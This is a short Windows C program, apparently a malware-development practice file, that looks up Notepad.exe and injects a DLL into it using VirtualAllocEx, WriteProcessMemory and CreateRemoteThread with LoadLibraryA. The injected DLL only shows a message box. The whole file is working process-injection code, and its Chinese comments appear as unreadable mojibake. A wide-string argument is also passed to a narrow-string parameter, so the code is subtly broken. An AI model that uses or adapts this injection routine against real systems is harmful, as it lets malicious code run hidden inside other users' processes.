//code by harry hard
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h> 

// ���ݽ�������ȡPID
DWORD GetProcessIdByName(const char* processName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "CreateToolhelp32Snapshot ʧ�� (������: %lu)\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &processEntry)) {
        do {
            wprintf(L"%s\n", processEntry.szExeFile);
            if (_wcsicmp(processEntry.szExeFile, processName) == 0) {
                pid = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    else {
        fprintf(stderr, "Process32First ʧ�� (������: %lu)\n", GetLastError());
    }

    CloseHandle(snapshot);
    return pid;
}

// DLLע�뺯��
BOOL InjectDLL(DWORD pid, const char* dllPath) {
    HANDLE hProcess = NULL;
    LPVOID remoteMemory = NULL;
    HANDLE hRemoteThread = NULL;
    BOOL success = FALSE;

    // 1. ��Ŀ�����
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        fprintf(stderr, "OpenProcess ʧ�� (������: %lu)\n", GetLastError());
        goto cleanup;
    }

    // 2. ����·�����ȣ���������ֹ����
    SIZE_T pathSize = strlen(dllPath) + 1;

    // 3. ����Զ���ڴ�
    remoteMemory = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT, PAGE_READWRITE);
    if (remoteMemory == NULL) {
        fprintf(stderr, "VirtualAllocEx ʧ�� (������: %lu)\n", GetLastError());
        goto cleanup;
    }

    // 4. д��DLL·��
    if (!WriteProcessMemory(hProcess, remoteMemory, dllPath, pathSize, NULL)) {
        fprintf(stderr, "WriteProcessMemory ʧ�� (������: %lu)\n", GetLastError());
        goto cleanup;
    }

    // 5. ��ȡLoadLibraryA��ַ
    LPTHREAD_START_ROUTINE loadLibraryAddr = (LPTHREAD_START_ROUTINE)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddr == NULL) {
        fprintf(stderr, "GetProcAddress ʧ�� (������: %lu)\n", GetLastError());
        goto cleanup;
    }

    // 6. ����Զ���߳�
    hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, loadLibraryAddr, remoteMemory, 0, NULL);
    if (hRemoteThread == NULL) {
        fprintf(stderr, "CreateRemoteThread ʧ�� (������: %lu)\n", GetLastError());
        goto cleanup;
    }

    // 7. �ȴ��߳����
    WaitForSingleObject(hRemoteThread, INFINITE);
    success = TRUE;

cleanup:
    // ������Դ
    if (remoteMemory != NULL) {
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
    }
    if (hRemoteThread != NULL) {
        CloseHandle(hRemoteThread);
    }
    if (hProcess != NULL) {
        CloseHandle(hProcess);
    }
    return success;
}

int main() {
    const wchar_t* targetProcess = L"Notepad.exe";
    const char* dllPath = "C:\\Users\\otis\\Documents\\mal_exclude\\maldev_program\\DLL injection\\MessageBoxA\\x64\\Release\\myMessageBox.dll";  // �滻Ϊʵ��·��

    DWORD pid = GetProcessIdByName(targetProcess);
    if (pid == 0) {
        fprintf(stderr, "δ�ҵ�����: %s\n", targetProcess);
        getchar();
        return 1;
    }

    printf("����ע��PID: %lu...\n", pid);
    getchar();
    if (InjectDLL(pid, dllPath)) {
        printf("ע��ɹ�!\n");
        getchar();
        return 0;
    }
    else {
        fprintf(stderr, "ע��ʧ��\n");
        getchar();
        return 1;
    }
}